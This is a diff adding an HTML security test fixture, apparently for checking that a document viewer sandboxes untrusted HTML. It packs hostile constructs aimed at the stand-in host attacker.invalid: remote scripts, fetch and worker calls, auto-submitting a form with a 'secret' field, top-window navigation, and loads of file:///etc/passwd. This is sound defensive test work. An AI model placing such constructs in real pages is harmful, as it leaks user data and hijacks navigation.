@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en" manifest="https://attacker.invalid/cache.appcache">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'">
+  <meta http-equiv="refresh" content="0;url=https://attacker.invalid/meta-refresh">
+  <base href="https://attacker.invalid/">
+  <title>Hostile security fixture</title>
+  <link rel="stylesheet" href="https://attacker.invalid/remote.css">
+  <script src="https://attacker.invalid/external.js"></script>
+  <script>
+    document.documentElement.dataset.scriptCreatedMarker = 'FAILED';
+    document.body.insertAdjacentHTML('beforeend', '<p id="script-marker">SCRIPT RAN</p>');
+    alert('FAILED: alert ran');
+    open('https://attacker.invalid/popup');
+    fetch('https://attacker.invalid/fetch');
+    new Worker('https://attacker.invalid/worker.js');
+    const frame = document.createElement('iframe');
+    frame.src = 'https://attacker.invalid/dynamic-frame';
+    document.body.append(frame);
+    const object = document.createElement('object');
+    object.data = 'https://attacker.invalid/dynamic-object';
+    document.body.append(object);
+    document.querySelector('form').requestSubmit();
+    window.top.location = 'https://attacker.invalid/top-navigation';
+  </script>
+</head>
+<body onload="document.body.dataset.onloadMarker='FAILED'">
+  <main>
+    <h1>Hostile document security test</h1>
+    <noscript>
+      <p id="noscript-success">SUCCESS: scripting is disabled.</p>
+    </noscript>
+    <img src="https://attacker.invalid/remote.png" onerror="document.body.dataset.onerrorMarker='FAILED'" alt="Remote image must be blocked">
+    <img src="file:///etc/passwd" alt="File URL must be blocked">
+    <img src="app://obsidian.md/private" alt="App URL must be blocked">
+    <img src="../outside-vault.png" alt="Parent traversal must be blocked">
+    <iframe src="https://attacker.invalid/frame"></iframe>
+    <object data="https://attacker.invalid/object"></object>
+    <embed src="https://attacker.invalid/embed">
+    <form action="https://attacker.invalid/form" method="post" target="_top">
+      <input name="secret" value="must-not-submit">
+      <button type="submit" formaction="https://attacker.invalid/alternate-form">Submit</button>
+    </form>
+    <a href="https://attacker.invalid/navigation" ping="https://attacker.invalid/ping" target="_top">Remote navigation</a>
+    <a href="file:///etc/passwd">File navigation</a>
+    <a href="app://obsidian.md/private">App navigation</a>
+    <a href="#safe-fragment">Safe fragment navigation</a>
+    <p id="safe-fragment">The document remains in its sandbox.</p>
+  </main>
+</body>
+</html>
